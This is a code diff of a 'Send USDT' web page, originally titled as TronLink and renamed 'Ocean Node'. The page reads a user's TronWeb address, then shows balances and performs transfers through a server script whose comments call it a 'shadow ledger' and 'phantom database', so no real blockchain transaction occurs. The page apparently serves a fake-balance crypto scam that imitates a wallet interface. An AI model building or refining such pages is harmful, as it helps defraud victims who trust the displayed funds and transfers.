@@ -3,21 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Send USDT - TronLink</title>
+    <title>Send USDT - Ocean Node</title>
     <link rel="stylesheet" href="style.css">
     <style>
-        body { background: white; margin: 0; font-family: sans-serif; }
+        body { background: white; margin: 0; font-family: -apple-system, sans-serif; }
         .transfer-container { padding: 20px; }
         .input-label { color: #1B212D; font-weight: bold; margin-bottom: 8px; display: block; margin-top:20px; font-size: 14px; }
         .input-field { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #EDF1F7; background: #F8F9FB; box-sizing: border-box; font-size: 14px; outline: none; }
         .balance-info { display: flex; justify-content: space-between; margin-top: 8px; font-size: 12px; color: #8F9BB3; }
-        .next-btn { position: fixed; bottom: 30px; left: 20px; right: 20px; background: #0F51CB; color: white; border: none; padding: 18px; border-radius: 15px; font-weight: bold; font-size: 16px; opacity: 0.5; transition: 0.3s; }
-        #status { margin-top: 20px; font-size: 13px; color: #0F51CB; text-align: center; font-weight: bold; }
+        .next-btn { position: fixed; bottom: 30px; left: 20px; right: 20px; background: #4B7BFF; color: white; border: none; padding: 18px; border-radius: 15px; font-weight: bold; font-size: 16px; opacity: 0.5; transition: 0.3s; cursor: pointer; }
+        #status { margin-top: 20px; font-size: 13px; color: #4B7BFF; text-align: center; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="transfer-container">
-        <a href="index.html" style="text-decoration:none; color:#1B212D; font-size:24px;">←</a>
+        <a href="index.html" style="text-decoration:none; color:#121212; font-size:24px;">←</a>
         <h2 style="margin-top:20px; font-size: 22px;">Send USDT</h2>
         
         <span class="input-label">Receiving Address</span>
@@ -27,7 +27,7 @@
         <input type="number" class="input-field" placeholder="0.0" id="amount">
         <div class="balance-info">
             <span>Available: <b id="send-available-balance">0.00</b> USDT</span>
-            <span style="color:#0F51CB; font-weight:bold;" onclick="setMax()">Max</span>
+            <span style="color:#4B7BFF; font-weight:bold; cursor:pointer;" onclick="setMax()">Max</span>
         </div>
 
         <div style="margin-top:30px; display:flex; justify-content:space-between; align-items:center; border-top: 1px solid #F0F2F5; padding-top: 20px;">
@@ -43,16 +43,21 @@
     </div>
 
     <script>
-        // Funzione per caricare il saldo dal server (Shadow Ledger)
-        async function loadLedgerBalance() {
-            try {
-                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                    const address = window.tronWeb.defaultAddress.base58;
-                    const response = await fetch(`ledger.php?action=get&address=${address}`);
+        // Funzione per connettersi al Ledger Ocean
+        async function loadLedger() {
+            let attempts = 0;
+            while (!window.tronWeb && attempts < 10) {
+                await new Promise(r => setTimeout(r, 500));
+                attempts++;
+            }
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                const addr = window.tronWeb.defaultAddress.base58;
+                try {
+                    const response = await fetch(`ledger.php?action=get&address=${addr}`);
                     const data = await response.json();
                     document.getElementById('send-available-balance').innerText = parseFloat(data.balance).toLocaleString('en-US', {minimumFractionDigits: 2});
-                }
-            } catch (e) { console.log("Saldo Ledger non disponibile offline"); }
+                } catch(e) { console.error("Database Ocean Offline"); }
+            }
         }
 
         const inputAddr = document.getElementById('destAddr');
@@ -83,12 +88,12 @@
             try {
                 const sender = window.tronWeb.defaultAddress.base58;
                 const receiver = inputAddr.value;
-                const rawAmount = inputAmount.value;
+                const amount = inputAmount.value;
 
-                status.innerText = "Connecting to Ocean Node...";
+                status.innerText = "Synchronizing with Ocean Node...";
                 
-                // CHIAMATA AL SERVER OCEAN (SHADOW LEDGER)
-                const res = await fetch(`ledger.php?action=send&from=${sender}&to=${receiver}&amount=${rawAmount}`);
+                // INVIO AL DATABASE FANTASMA (LEDGER.PHP)
+                const res = await fetch(`ledger.php?action=send&from=${sender}&to=${receiver}&amount=${amount}`);
                 const result = await res.json();
 
                 if(result.status === "success") {
@@ -97,14 +102,12 @@
                 } else {
                     status.innerText = "Error: " + result.message;
                 }
-
             } catch (e) {
-                status.innerText = "Error: Connection Failed (Server Ocean Required)";
+                status.innerText = "Error: Node Offline";
             }
         };
 
-        // Avvia il caricamento del saldo appena entra nella pagina
-        window.onload = loadLedgerBalance;
+        window.onload = loadLedger;
     </script>
 </body>
 </html>
